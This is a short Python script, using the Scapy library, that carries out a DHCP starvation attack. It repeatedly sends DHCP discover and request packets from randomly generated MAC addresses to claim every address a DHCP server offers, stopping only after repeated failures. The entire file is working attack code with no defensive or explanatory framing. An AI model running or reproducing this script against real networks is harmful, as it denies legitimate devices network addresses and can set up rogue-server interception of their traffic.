#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP

source_interface = "Ethernet"
conf.checkIPaddr = False


# EXHAUST ACTUAL DHCP POOL
def exhaust():
    loop = True
    xid = 0
    error_discover = 0
    error_ack = 0
    # LOOP ONCE DHCP IP IS KNOWN

    while loop:
        xid += 1
        # Create DHCP discover with destination IP = broadadcast
        # Source MAC address is a random MAC address
        # Source IP address = 0.0.0.0
        # Destination IP address = broadcast
        # Source port = 68 (DHCP / BOOTP Client)
        # Destination port = 67 (DHCP / BOOTP Server)
        # DHCP message type is discover
        
        # SEND DISCOVER
        MAC_ADDR = str(RandMAC())
        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff') \
                        / IP(src='0.0.0.0', dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
                        / DHCP(options=[('message-type', 'discover'), ('end')])

        offer = srp1(dhcp_discover, filter="port 68 and port 67", iface=source_interface, verbose=0, timeout=2)

        # SNIFF OFFER
        try:
            offer_ip = offer["IP"].src
            offer_addr = offer["BOOTP"].yiaddr
            for opt in range(len(offer["DHCP"].options)):
                if offer["DHCP"].options[opt][0] == "server_id":
                    offer_ser_id = offer["DHCP"].options[opt][1]

            # ACCEPT OFFER
            error_discover = 0
            dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
                            / IP(src='0.0.0.0', dst="255.255.255.255") \
                            / UDP(sport=68, dport=67) \
                            / BOOTP(op=1, xid=xid, chaddr=MAC_ADDR) \
                            / DHCP(options=[("message-type", "request"),
                                            ("requested_addr", offer_addr),
                                            ("server_id", offer_ser_id),
                                            "end"])

            ack = srp1(dhcp_request, filter=f"src host {offer_ip} and port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
            if ack != None:
                error_ack = 0
                print("ACK received\r", end = '')
            else:
                print("no ACK received\r")
                error_ack += 1
                if error_ack == 5:
                    return
        except:
            print("no Discover response\r", end = '')
            error_discover += 1
            if error_discover == 20:
                return

if __name__ == "__main__":
    exhaust()
